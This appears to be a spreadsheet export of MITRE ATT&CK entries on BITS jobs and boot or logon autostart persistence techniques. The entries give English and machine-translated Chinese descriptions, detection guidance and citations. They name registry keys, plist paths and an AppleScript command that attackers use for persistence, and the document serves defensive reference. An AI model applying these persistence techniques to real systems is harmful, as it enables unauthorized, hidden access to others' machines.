Monitor and analyze network activity generated by BITS. BITS jobs use HTTP(S) and SMB for remote connections and are tethered to the creating user and will only function when that user is logged on (this rule applies even if a user attaches the job to a service account).(Citation: Microsoft BITS)",Windows,"Command: Command Execution, Network Traffic: Network Connection Creation, Process: Process Creation, Service: Service Metadata",False,,"Firewall, Host forensic analysis","Brent Murphy, Elastic; David French, Elastic; Red Canary; Ricardo Dias",,,,,,,"(Citation: Group IB Ransomware September 2020),(Citation: FireEye APT41 March 2020),(Citation: NCC Group Team9 June 2020),(Citation: FBI FLASH APT39 September 2020),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: CobaltStrike Scripted Web Delivery),(Citation: Intrinsec Egregor Nov 2020),(Citation: Microsoft PLATINUM April 2016),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: Talos Cobalt Strike September 2020),(Citation: TrendMicro Tropic Trooper Mar 2018),(Citation: FireEye Periscope March 2018),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: Unit 42 BackConfig May 2020),(Citation: PaloAlto UBoatRAT Nov 2017),(Citation: Microsoft BITS),(Citation: Symantec BITS May 2007)",BITS任务,攻击者可能会滥用 BITS 作业来持续执行代码并执行各种后台任务。 Windows 后台智能传输服务 (BITS) 是一种通过 [组件对象模型] (https://attack.mitre.org/techniques/T1559/001) (COM) 公开的低带宽、异步文件传输机制。（引用：Microsoft COM)（引用：Microsoft BITS）BITS 通常被更新程序、信使和其他首选在后台运行（使用可用空闲带宽）而不中断其他联网应用程序的应用程序使用。文件传输任务被实现为 BITS 作业，其中包含一个或多个文件操作的队列。可通过 [PowerShell](https://attack.mitre.org/techniques/T1059/001) 和 [BITSAdmin](https://attack.mitre.org/software/S0190) 访问创建和管理 BITS 作业的界面) 工具。（引用：Microsoft BITS）（引用：Microsoft BITSAdmin）攻击者可能会滥用 BITS 来下载（例如 [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)）、执行甚至清理在运行恶意代码后启动（例如 [Indicator Removal](https://attack.mitre.org/techniques/T1070)）。 BITS 任务在 BITS 作业数据库中是自包含的，无需新文件或注册表修改，并且通常由主机防火墙允许。（引文：CTU BITS Malware 2016 年 6 月）（引文：Mondok Windows PiggyBack BITS 2007 年 5 月）（引文：赛门铁克 BITS 2007 年 5 月）启用 BITS 的执行还可以通过创建长期作业（默认最长生存期为 90 天且可扩展）或在作业完成或错误时（包括系统重新启动后）调用任意程序来启用持久性。（引用：PaloAlto UBoatRAT 2017 年 11 月）（引文：CTU BITS 恶意软件 2016 年 6 月）BITS 上传功能也可用于执行 [Exfiltration Over Alternative Protocol]（https://attack.mitre.org/techniques/T1048）。（引文：CTU BITS 恶意软件 6 月2016)
T1547,Boot or Logon Autostart Execution,"Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.(Citation: Microsoft Run Key)(Citation: MSDN Authentication Packages)(Citation: Microsoft TimeProvider)(Citation: Cylance Reg Persistence Sept 2013)(Citation: Linux Kernel Programming) These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.

Since some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.",https://attack.mitre.org/techniques/T1547,23 January 2020,18 April 2022,1.1,"Persistence, Privilege Escalation","Monitor for additions or modifications of mechanisms that could be used to trigger autostart execution, such as relevant additions to the Registry. Look for changes that are not correlated with known updates, patches, or other planned administrative activity. Tools such as Sysinternals Autoruns may also be used to detect system autostart configuration changes that could be attempts at persistence.(Citation: TechNet Autoruns)  Changes to some autostart configuration settings may happen under normal conditions when legitimate software is installed. 

Suspicious program execution as autostart programs may show up as outlier processes that have not been seen before when compared against historical data.To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.

Monitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Look for abnormal process behavior that may be due to a process loading a malicious DLL.

Monitor for abnormal usage of utilities and command-line parameters involved in kernel modification or driver installation.","Linux, Windows, macOS","Command: Command Execution, Driver: Driver Load, File: File Creation, File: File Modification, Kernel: Kernel Module Load, Module: Module Load, Process: OS API Execution, Process: Process Creation, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification",False,,,,"Administrator, root, User",,,CAPEC-564,,,"(Citation: Checkpoint IndigoZebra July 2021),(Citation: Cylance Dust Storm),(Citation: Securelist Dtrack),",引导或登录自动启动执行,攻击者可能会将系统设置配置为在系统启动或登录期间自动执行程序，以保持持久性或在受感染的系统上获得更高级别的权限。操作系统可能具有在系统启动或帐户登录时自动运行程序的机制。（引用：Microsoft Run Key）（引用：MSDN Authentication Packages）（引用：Microsoft TimeProvider）（引用：Cylance Reg Persistence Sept 2013）（引用：Linux内核编程）这些机制可能包括自动执行程序，这些程序放置在专门指定的目录中或由存储配置信息的存储库（例如 Windows 注册表）引用。攻击者可以通过修改或扩展内核的功能来实现相同的目标。由于某些引导或登录自动启动程序以更高的权限运行，攻击者可能会利用这些来提升权限。
T1547.014,Boot or Logon Autostart Execution: Active Setup,"Adversaries may achieve persistence by adding a Registry key to the Active Setup of the local machine. Active Setup is a Windows mechanism that is used to execute programs when a user logs in. The value stored in the Registry key will be executed after a user logs into the computer.(Citation: Klein Active Setup 2010) These programs will be executed under the context of the user and will have the account's associated permissions level.

Adversaries may abuse Active Setup by creating a key under <code> HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\</code> and setting a malicious value for <code>StubPath</code>. This value will serve as the program that will be executed when a user logs into the computer.(Citation: Mandiant Glyer APT 2010)(Citation: Citizenlab Packrat 2015)(Citation: FireEye CFR Watering Hole 2012)(Citation: SECURELIST Bright Star 2015)(Citation: paloalto Tropic Trooper 2016)

Adversaries can abuse these components to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.",https://attack.mitre.org/techniques/T1547/014,18 December 2020,05 March 2021,1.0,"Persistence, Privilege Escalation","Monitor Registry key additions and/or modifications to <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Active Setup\Installed Components\</code>.

Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the Active Setup Registry locations and startup folders.(Citation: TechNet Autoruns) Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.",Windows,"Command: Command Execution, Process: Process Creation, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification",True,T1547,,"Bencherchali Nasreddine, @nas_bench, ELIT Security Team (DSSD)",Administrator,,,,,,"(Citation: paloalto Tropic Trooper 2016),(Citation: FireEye Regsvr32 Targeting Mongolian Gov),(Citation: Microsoft PoisonIvy 2017),",引导或登录自动启动执行：活动设置,攻击者可以通过将注册表项添加到本地计算机的活动设置来实现持久性。 Active Setup 是一种 Windows 机制，用于在用户登录时执行程序。注册表项中存储的值将在用户登录计算机后执行。（引用：Klein Active Setup 2010）这些程序将在用户的上下文，并将具有帐户的关联权限级别。攻击者可能通过在 <code> HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\</code> 下创建密钥并为 <code>StubPath</code> 设置恶意值来滥用 Active Setup。此值将用作用户登录计算机时将执行的程序。（引用：Mandiant Glyer APT 2010）（引用：Citizenlab Packrat 2015）（引用：FireEye CFR Watering Hole 2012）（引用：SECURELIST Bright Star 2015 )（引用：paloalto Tropic Trooper 2016）攻击者可以滥用这些组件来执行恶意软件，例如远程访问工具，以通过系统重启来保持持久性。攻击者还可以使用 [伪装](https://attack.mitre.org/techniques/T1036) 使注册表条目看起来好像与合法程序相关联。
T1547.002,Boot or Logon Autostart Execution: Authentication Package,"Adversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system.(Citation: MSDN Authentication Packages)

Adversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registry location <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\</code> with the key value of <code>""Authentication Packages""=&lt;target binary&gt;</code>. The binary will then be executed by the system when the authentication packages are loaded.",https://attack.mitre.org/techniques/T1547/002,24 January 2020,20 April 2022,1.0,"Persistence, Privilege Escalation",Monitor the Registry for changes to the LSA Registry keys. Monitor the LSA process for DLL loads. Windows 8.1 and Windows Server 2012 R2 may generate events when unsigned DLLs try to load into the LSA by setting the Registry key <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\LSASS.exe</code> with AuditLevel = 8. (Citation: Graeber 2014) (Citation: Microsoft Configure LSA),Windows,"Command: Command Execution, Module: Module Load, Windows Registry: Windows Registry Key Modification",True,T1547,,,Administrator,,,,,,"(Citation: Crysys Skywiper),(Citation: Microsoft Configure LSA),(Citation: Graeber 2014)",引导或登录自动启动执行：身份验证包,"攻击者可能会在系统启动时滥用身份验证包来执行 DLL。 Windows 身份验证包 DLL 由本地安全机构 (LSA) 进程在系统启动时加载。它们为操作系统的多个登录过程和多个安全协议提供支持。（引用：MSDN 身份验证包）攻击者可以使用 LSA 身份验证包提供的自动启动机制来实现持久性，方法是在 Windows 注册表位置 <code >HKLM\SYSTEM\CurrentControlSet\Control\Lsa\</code>，键值为 <code>""Authentication Packages""=<target binary></code>。然后，在加载身份验证包时，系统将执行二进制文件。"
T1547.006,Boot or Logon Autostart Execution: Kernel Modules and Extensions,"Adversaries may modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system.(Citation: Linux Kernel Programming) 

When used maliciously, LKMs can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0).(Citation: Linux Kernel Module Programming Guide) Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors, and enabling root access to non-privileged users.(Citation: iDefense Rootkit Overview)

Kernel extensions, also called kext, are used in macOS to load functionality onto a system similar to LKMs for Linux. Since the kernel is responsible for enforcing security and the kernel extensions run as apart of the kernel, kexts are not governed by macOS security policies. Kexts are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Kexts need to be signed with a developer ID that is granted privileges by Apple allowing it to sign Kernel extensions. Developers without these privileges may still sign kexts but they will not load unless SIP is disabled. If SIP is enabled, the kext signature is verified before being added to the AuxKC.(Citation: System and kernel extensions in macOS)

Since macOS Catalina 10.15, kernel extensions have been deprecated in favor of System Extensions. However, kexts are still allowed as ""Legacy System Extensions"" since there is no System Extension for Kernel Programming Interfaces.(Citation: Apple Kernel Extension Deprecation)

Adversaries can use LKMs and kexts to conduct [Persistence](https://attack.mitre.org/tactics/TA0003) and/or [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) on a system. Examples have been found in the wild, and there are some relevant open source projects as well.(Citation: Volatility Phalanx2)(Citation: CrowdStrike Linux Rootkit)(Citation: GitHub Reptile)(Citation: GitHub Diamorphine)(Citation: RSAC 2015 San Francisco Patrick Wardle)(Citation: Synack Secure Kernel Extension Broken)(Citation: Securelist Ventir)(Citation: Trend Micro Skidmap)",https://attack.mitre.org/techniques/T1547/006,24 January 2020,20 April 2022,1.3,"Persistence, Privilege Escalation","Loading, unloading, and manipulating modules on Linux systems can be detected by monitoring for the following commands: <code>modprobe</code>, <code>insmod</code>, <code>lsmod</code>, <code>rmmod</code>, or <code>modinfo</code> (Citation: Linux Loadable Kernel Module Insert and Remove LKMs) LKMs are typically loaded into <code>/lib/modules</code> and have had the extension .ko (""kernel object"") since version 2.6 of the Linux kernel. (Citation: Wikipedia Loadable Kernel Module)

Adversaries may run commands on the target system before loading a malicious module in order to ensure that it is properly compiled. (Citation: iDefense Rootkit Overview) Adversaries may also execute commands to identify the exact version of the running Linux kernel and/or download multiple versions of the same .ko (kernel object) files to use the one appropriate for the running system.(Citation: Trend Micro Skidmap) Many LKMs require Linux headers (specific to the target kernel) in order to compile properly. These are typically obtained through the operating systems package manager and installed like a normal package. On Ubuntu and Debian based systems this can be accomplished by running: <code>apt-get install linux-headers-$(uname -r)</code> On RHEL and CentOS based systems this can be accomplished by running: <code>yum install kernel-devel-$(uname -r)</code>

On macOS, monitor for execution of <code>kextload</code> commands and user installed kernel extensions performing abnormal and/or potentially malicious activity (such as creating network connections). Monitor for new rows added in the <code>kext_policy</code> table. KextPolicy stores a list of user approved (non Apple) kernel extensions and a partial history of loaded kernel modules in a SQLite database, <code>/var/db/SystemPolicyConfiguration/KextPolicy</code>.(Citation: User Approved Kernel Extension Pike’s)(Citation: Purves Kextpocalypse 2)(Citation: Apple Developer Configuration Profile)
","Linux, macOS","Command: Command Execution, File: File Creation, File: File Modification, Kernel: Kernel Module Load, Process: Process Creation",True,T1547,,"Anastasios Pingios; Eric Kaiser @ideologysec; Jeremy Galloway; Red Canary; Wayne Silva, F-Secure Countercept",root,,,,,,"(Citation: Trend Micro Skidmap),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: NSA/FBI Drovorub August 2020),(Citation: Kernel.org Restrict Kernel Module),(Citation: Wikibooks Grsecurity),(Citation: Chkrootkit Main),(Citation: SourceForge rkhunter),(Citation: MDMProfileConfigMacOS),(Citation: Increasing Linux kernel integrity),(Citation: LKM loading kernel restrictions),(Citation: Apple TN2459 Kernel Extensions),(Citation: Kernel Self Protection Project)",引导或登录自动启动执行：内核模块和扩展,攻击者可能会修改内核以在系统启动时自动执行程序。可加载内核模块 (LKM) 是可以根据需要加载和卸载到内核中的代码片段。它们无需重新启动系统即可扩展内核的功能。例如，一种模块是设备驱动程序，它允许内核访问连接到系统的硬件。（引用：Linux Kernel Programming）当被恶意使用时，LKM 可以是一种内核模式 [Rootkit]（https： //attack.mitre.org/techniques/T1014) 以最高操作系统特权 (Ring 0) 运行。(Citation: Linux Kernel Module Programming Guide) 基于 LKM 的 rootkit 的共同特征包括：隐藏自身、选择性隐藏文件、进程和网络活动，以及日志篡改，提供经过身份验证的后门，并启用对非特权用户的 root 访问。（引用：iDefense Rootkit 概述）内核扩展，也称为 kext，在 macOS 中用于将功能加载到类似的系统上到 Linux 的 LKM。由于内核负责执行安全性并且内核扩展作为内核的一部分运行，因此 kext 不受 macOS 安全策略的约束。通过 <code>kextload</code> 和 <code>kextunload</code> 命令加载和卸载 Kext。 Kexts 需要使用 Apple 授予的开发人员 ID 进行签名，允许其签署内核扩展。没有这些权限的开发人员仍然可以签署 kext，但除非禁用 SIP，否则它们不会加载。如果启用了 SIP，则在添加到 AuxKC 之前验证 kext 签名。（引用：macOS 中的系统和内核扩展）自 macOS Catalina 10.15 以来，内核扩展已被弃用，取而代之的是系统扩展。但是，kexts 仍然被允许作为“遗留系统扩展”，因为没有内核编程接口的系统扩展。（引用：Apple Kernel Extension Deprecation）攻击者可以使用 LKM 和 kexts 进行 [Persistence]（https://attack.mitre .org/tactics/TA0003) 和/或 [权限升级](https://attack.mitre.org/tactics/TA0004) 在系统上。例子已经在野外找到了，也有一些相关的开源项目。（引用：Volatility Phalanx2）（引用：CrowdStrike Linux Rootkit）（引用：GitHub Reptile）（引用：GitHub Diamorphine）（引用：RSAC 2015 San Francisco Patrick Wardle）（引用：Synack Secure Kernel Extension Broken）（引用：Securelist Ventir）（引用：Trend Micro Skidmap）
T1547.008,Boot or Logon Autostart Execution: LSASS Driver,"Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process.(Citation: Microsoft Security Subsystem)

Adversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g., [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574)), an adversary can use LSA operations to continuously execute malicious payloads.",https://attack.mitre.org/techniques/T1547/008,24 January 2020,20 April 2022,1.0,"Persistence, Privilege Escalation","With LSA Protection enabled, monitor the event logs (Events 3033 and 3063) for failed attempts to load LSA plug-ins and drivers. (Citation: Microsoft LSA Protection Mar 2014) Also monitor DLL load operations in lsass.exe. (Citation: Microsoft DLL Security)

Utilize the Sysinternals Autoruns/Autorunsc utility (Citation: TechNet Autoruns) to examine loaded drivers associated with the LSA. ",Windows,"Driver: Driver Load, File: File Creation, File: File Modification, Module: Module Load",True,T1547,,Vincent Le Toux,"Administrator, SYSTEM",,,,,,"(Citation: Microsoft SIR Vol 21),(Citation: Symantec Pasam May 2012),(Citation: Microsoft Wingbird Nov 2017),(Citation: Microsoft DLL Security),(Citation: Microsoft LSA Protection Mar 2014),(Citation: Microsoft Enable Cred Guard April 2017),(Citation: Microsoft Credential Guard April 2017)",引导或登录自动启动执行：LSASS 驱动程序,攻击者可能会修改或添加 LSASS 驱动程序以获得对受感染系统的持久性。 Windows 安全子系统是一组组件，用于管理和实施计算机或域的安全策略。本地安全机构（LSA）是负责本地安全策略和用户认证的主要组件。 LSA 包括与各种其他安全功能相关联的多个动态链接库 (DLL)，所有这些都在 LSA 子系统服务 (LSASS) lsass.exe 进程的上下文中运行。（引用：Microsoft 安全子系统）攻击者可能将 LSASS 驱动程序作为目标获得持久性。通过替换或添加非法驱动程序（例如，[劫持执行流程]（https://attack.mitre.org/techniques/T1574）），攻击者可以使用 LSA 操作来持续执行恶意负载。
T1547.015,Boot or Logon Autostart Execution: Login Items,"Adversaries may add login items to execute upon user login to gain persistence or escalate privileges. Login items are applications, documents, folders, or server connections that are automatically launched when a user logs in.(Citation: Open Login Items Apple) Login items can be added via a shared file list or Service Management Framework.(Citation: Adding Login Items) Shared file list login items can be set using scripting languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002), whereas the Service Management Framework uses the API call <code>SMLoginItemSetEnabled</code>.

Login items installed using the Service Management Framework leverage <code>launchd</code>, are not visible in the System Preferences, and can only be removed by the application that created them.(Citation: Adding Login Items)(Citation: SMLoginItemSetEnabled Schroeder 2013) Login items created using a shared file list are visible in System Preferences, can hide the application when it launches, and are executed through LaunchServices, not launchd, to open applications, documents, or URLs without using Finder.(Citation: Launch Services Apple Developer) Users and applications use login items to configure their user environment to launch commonly used services or applications, such as email, chat, and music applications.

Adversaries can utilize [AppleScript](https://attack.mitre.org/techniques/T1059/002) and [Native API](https://attack.mitre.org/techniques/T1106) calls to create a login item to spawn malicious executables.(Citation: ELC Running at startup) Prior to version 10.5 on macOS, adversaries can add login items by using [AppleScript](https://attack.mitre.org/techniques/T1059/002) to send an Apple events to the “System Events” process, which has an AppleScript dictionary for manipulating login items.(Citation: Login Items AE) Adversaries can use a command such as <code>tell application “System Events” to make login item at end with properties /path/to/executable</code>.(Citation: Startup Items Eclectic)(Citation: hexed osx.dok analysis 2019)(Citation: Add List Remove Login Items Apple Script) This command adds the path of the malicious executable to the login item file list located in <code>~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm</code>.(Citation: Startup Items Eclectic) Adversaries can also use login items to launch executables that can be used to control the victim system remotely or as a means to gain privilege escalation by prompting for user credentials.(Citation: objsee mac malware 2017)(Citation: CheckPoint Dok)(Citation: objsee netwire backdoor 2019)",https://attack.mitre.org/techniques/T1547/015,05 October 2021,18 October 2021,1.0,"Persistence, Privilege Escalation","All login items created via shared file lists are viewable by using the System Preferences GUI or in the <code>~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm</code> file.(Citation: Open Login Items Apple)(Citation: Startup Items Eclectic)(Citation: objsee block blocking login items)(Citation: sentinelone macos persist Jun 2019) These locations should be monitored and audited for known good applications.

Otherwise, login Items are located in <code>Contents/Library/LoginItems</code> within an application bundle, so these paths should be monitored as well.(Citation: Adding Login Items) Monitor applications that leverage login items with either the LSUIElement or LSBackgroundOnly key in the Info.plist file set to true.(Citation: Adding Login Items)(Citation: Launch Service Keys Developer Apple)

Monitor processes that start at login for unusual or unknown applications. Usual applications for login items could include what users add to configure their user environment, such as email, chat, or music applications, or what administrators include for organization settings and protections. Check for running applications from login items that also have abnormal behavior,, such as establishing network connections.",macOS,"File: File Creation, File: File Modification, Process: Process Creation",True,T1547,,,User,,,,,,"(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: Red Canary NETWIRE January 2020),(Citation: hexed osx.dok analysis 2019),(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),",引导或登录自动启动执行：登录项,攻击者可能会添加登录项以在用户登录时执行以获得持久性或升级权限。登录项是用户登录时自动启动的应用程序、文档、文件夹或服务器连接。（引文：Open Login Items Apple）可以通过共享文件列表或服务管理框架添加登录项。（引文：添加登录项）共享文件列表登录项可以使用[AppleScript]（https://attack.mitre.org/techniques/T1059/002）等脚本语言设置，而服务管理框架使用API调用<code>SMLoginItemSetEnabled< /代码>。使用服务管理框架安装的登录项利用 <code>launchd</code>，在系统偏好设置中不可见，只能由创建它们的应用程序删除。（引用：添加登录项）（引用：SMLoginItemSetEnabled Schroeder 2013）使用共享文件列表创建的登录项在系统偏好设置中可见，可以在启动时隐藏应用程序，并通过 LaunchServices 执行，而不是启动，以在不使用 Finder 的情况下打开应用程序、文档或 URL。（引用：启动服务Apple Developer）用户和应用程序使用登录项来配置他们的用户环境以启动常用的服务或应用程序，例如电子邮件、聊天和音乐应用程序。攻击者可以利用 [AppleScript](https://attack.mitre.org/techniques/T1059/002) 和 [Native API](https://attack.mitre.org/techniques/T1106) 调用来创建登录项以生成恶意可执行文件。（引用：ELC 在启动时运行）在 macOS 上的 10.5 版本之前，攻击者可以通过使用 [AppleScript](https://attack.mitre.org/techniques/T1059/002) 添加登录项来发送 Apple事件到“系统事件”进程，它有一个用于操作登录项的 AppleScript 字典。（引用：登录项 AE）攻击者可以使用诸如 <code>tell application “System Events” 之类的命令来使登录项带有属性/path/to/executable</code>.(Citation: Startup Items Eclectic)(Citation: hexed osx.dok analysis 2019)(Citation: Add List Remove Login Items Apple Script) 此命令将恶意可执行文件的路径添加到登录项文件列表位于 <code>~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm</code>.(Citation : Startup Items Eclectic) 攻击者还可以使用登录项来启动可执行文件，这些可执行文件可用于远程控制受害系统或通过提示用户凭据来获得权限升级。（引用：objsee mac 恶意软件 2017）（引用：CheckPoint Dok）（引用：objsee netwire 后门 2019）
T1547.010,Boot or Logon Autostart Execution: Port Monitors,"Adversaries may use port monitors to run an adversary supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the <code>AddMonitor</code> API call to set a DLL to be loaded at startup.(Citation: AddMonitor) This DLL can be located in <code>C:\Windows\System32</code> and will be loaded by the print spooler service, spoolsv.exe, on boot. The spoolsv.exe process also runs under SYSTEM level permissions.(Citation: Bloxham) Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to <code>HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors</code>. 

The Registry key contains entries for the following:

* Local Port
* Standard TCP/IP Port
* USB Monitor
* WSD Port

Adversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as SYSTEM.",https://attack.mitre.org/techniques/T1547/010,24 January 2020,20 April 2022,1.1,"Persistence, Privilege Escalation","Monitor process API calls to <code>AddMonitor</code>.(Citation: AddMonitor) Monitor DLLs that are loaded by spoolsv.exe for DLLs that are abnormal. New DLLs written to the System32 directory that do not correlate with known good software or patching may be suspicious. 

Monitor Registry writes to <code>HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors</code>. Run the Autoruns utility, which checks for this Registry key as a persistence mechanism.(Citation: TechNet Autoruns)",Windows,"File: File Creation, Module: Module Load, Process: OS API Execution, Windows Registry: Windows Registry Key Modification",True,T1547,,"Stefan Kanthak; Travis Smith, Tripwire","Administrator, SYSTEM",,,,,SYSTEM,",",引导或登录自动启动执行：端口监视器,攻击者可以使用端口监视器在系统启动期间运行攻击者提供的 DLL，以实现持久性或特权升级。端口监视器可以通过<code>AddMonitor</code> API 调用来设置启动时加载的DLL。（引用：AddMonitor）这个DLL 可以位于<code>C:\Windows\System32</ code> 并将在启动时由打印后台处理程序服务 spoolsv.exe 加载。 spoolsv.exe 进程也在 SYSTEM 级别权限下运行。（引用：Bloxham）或者，如果权限允许将该 DLL 的完全限定路径名写入 <code>HKLM\SYSTEM\CurrentControlSet\Control\Print，则可以加载任意 DLL \监视器</code>。注册表项包含以下条目： * 本地端口 * 标准 TCP/IP 端口 * USB 监视器 * WSD 端口 攻击者可以使用此技术在启动时加载恶意代码，这些代码将在系统重新启动时持续存在并以 SYSTEM 身份执行。
T1547.012,Boot or Logon Autostart Execution: Print Processors,"Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, spoolsv.exe, during boot. 

Adversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the <code>AddPrintProcessor</code> API call with an account that has <code>SeLoadDriverPrivilege</code> enabled. Alternatively, a print processor can be registered to the print spooler service by adding the <code>HKLM\SYSTEM\\[CurrentControlSet or ControlSet001]\Control\Print\Environments\\[Windows architecture: e.g., Windows x64]\Print Processors\\[user defined]\Driver</code> Registry key that points to the DLL. For the print processor to be correctly installed, it must be located in the system print-processor directory that can be found with the <code>GetPrintProcessorDirectory</code> API call.(Citation: Microsoft AddPrintProcessor May 2018) After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.(Citation: ESET PipeMon May 2020) The print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.",https://attack.mitre.org/techniques/T1547/012,05 October 2020,09 October 2020,1.0,"Persistence, Privilege Escalation","Monitor process API calls to <code>AddPrintProcessor</code> and <code>GetPrintProcessorDirectory</code>. New print processor DLLs are written to the print processor directory. Also monitor Registry writes to <code>HKLM\SYSTEM\ControlSet001\Control\Print\Environments\\[Windows architecture]\Print Processors\\[user defined]\\Driver</code> or <code>HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\\[Windows architecture]\Print Processors\\[user defined]\Driver</code> as they pertain to print processor installations.

Monitor for abnormal DLLs that are loaded by spoolsv.exe. Print processors that do not correlate with known good software or patching may be suspicious.",Windows,"Driver: Driver Load, File: File Creation, Module: Module Load, Process: OS API Execution, Windows Registry: Windows Registry Key Modification",True,T1547,,"Mathieu Tartare, ESET","Administrator, SYSTEM",,,,,,"(Citation: TrendMicro EarthLusca 2022),(Citation: ESET Gelsemium June 2021),(Citation: ESET PipeMon May 2020),",引导或登录自动启动执行：打印处理器,攻击者可能会滥用打印处理器在系统启动期间运行恶意 DLL，以实现持久性和/或权限提升。打印处理器是由打印后台处理程序服务 spoolsv.exe 在引导期间加载的 DLL。攻击者可能会通过添加在启动时加载恶意 DLL 的打印处理器来滥用打印后台处理程序服务。可以使用启用了 <code>SeLoadDriverPrivilege</code> 的帐户通过 <code>AddPrintProcessor</code> API 调用安装打印处理器。或者，可以通过添加 <code>HKLM\SYSTEM\\[CurrentControlSet or ControlSet001]\Control\Print\Environments\\[Windows 体系结构：例如 Windows x64]\Print Processors\ 将打印处理器注册到打印后台处理程序服务\[user defined]\Driver</code> 指向 DLL 的注册表项。要正确安装打印处理器，它必须位于系统打印处理器目录中，该目录可通过 <code>GetPrintProcessorDirectory</code> API 调用找到。（引用：Microsoft AddPrintProcessor May 2018）打印处理器安装后安装后，必须重新启动在引导期间启动的打印后台处理程序服务才能运行。（引用：ESET PipeMon 2020 年 5 月）打印后台处理程序服务在 SYSTEM 级别权限下运行，因此攻击者安装的打印处理器可能在提升的特权。
T1547.007,Boot or Logon Autostart Execution: Re-opened Applications,"Adversaries may modify plist files to automatically run an application when a user logs in. When a user logs out or restarts via the macOS Graphical User Interface (GUI), a prompt is provided to the user with a checkbox to ""Reopen windows when logging back in"".(Citation: Re-Open windows on Mac) When selected, all applications currently open are added to a property list file named <code>com.apple.loginwindow.[UUID].plist</code> within the <code>~/Library/Preferences/ByHost</code> directory.(Citation: Methods of Mac Malware Persistence)(Citation: Wardle Persistence Chapter) Applications listed in this file are automatically reopened upon the user’s next logon.

Adversaries can establish [Persistence](https://attack.mitre.org/tactics/TA0003) by adding a malicious application path to the <code>com.apple.loginwindow.[UUID].plist</code> file to execute payloads when a user logs in.",https://attack.mitre.org/techniques/T1547/007,24 January 2020,19 April 2022,1.1,"Persistence, Privilege Escalation",Monitoring the specific plist files associated with reopening applications can indicate when an application has registered itself to be reopened.,macOS,"Command: Command Execution, File: File Modification",True,T1547,,,User,,,,,,",(Citation: Re-Open windows on Mac)",引导或登录自动启动执行：重新打开的应用程序,"攻击者可能会修改 plist 文件以在用户登录时自动运行应用程序。当用户通过 macOS 图形用户界面 (GUI) 注销或重新启动时，会向用户提供一个提示，其中包含“重新登录时重新打开窗口”复选框in"".(Citation: Re-Open windows on Mac) 选中后，当前打开的所有应用程序都将添加到 <code>com.apple.loginwindow.[UUID].plist</code> 的属性列表文件中>~/Library/Preferences/ByHost</code> 目录。（引用：Mac 恶意软件持久性方法）（引用：Wardle 持久性章节）此文件中列出的应用程序会在用户下次登录时自动重新打开。攻击者可以通过在<code>com.apple.loginwindow.[UUID].plist</code>文件中添加恶意应用路径来建立[Persistence](https://attack.mitre.org/tactics/TA0003)执行用户登录时的有效负载。"
